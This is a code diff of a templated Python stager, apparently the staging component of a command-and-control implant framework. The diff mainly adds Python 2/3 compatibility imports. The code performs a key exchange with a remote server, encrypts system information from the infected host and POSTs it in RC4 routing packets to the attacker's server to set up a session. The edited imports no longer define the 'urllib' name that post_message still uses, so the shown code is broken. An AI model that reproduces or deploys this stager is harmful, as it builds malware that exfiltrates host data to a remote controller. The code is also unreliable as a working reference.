@@ -11,11 +11,21 @@ This file is a Jinja2 template.
         stage_2
 """
 from __future__ import print_function
-
+from __future__ import unicode_literals
+from __future__ import division
+from __future__ import absolute_import
+from builtins import str
+from builtins import bytes
+from builtins import chr
+from builtins import zip
+from builtins import range
+from builtins import int
+from future import standard_library
+standard_library.install_aliases()
 import copy
 import random
 import string
-import urllib.request as urllib
+from urllib.request import urlopen, Request
 
 {% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
@@ -25,7 +35,6 @@ import urllib.request as urllib
 def post_message(uri, data):
     global headers
     return (urllib.urlopen(urllib.Request(uri, data, headers))).read()
-
 # generate a randomized sessionID
 sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
 
@@ -64,7 +73,6 @@ hmacData = aes_encrypt_then_hmac(stagingKey, str(clientPub.publicKey))
 # RC4 routing packet:
 #   meta = STAGE1 (2)
 routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)
-
 try:
     postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
     # response = post_message(postURI, routingPacket+hmacData)
@@ -91,8 +99,8 @@ hmacData = aes_encrypt_then_hmac(clientPub.key, get_sysinfo(nonce=str(int(nonce)
 #   meta = STAGE2 (3)
 #   extra = 0
 #   length = len(length)
+#print(repr(hmacData))
 routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)
-
 response = post_message(postURI, routingPacket)
 
 # step 6 -> server sends HMAC(AES)
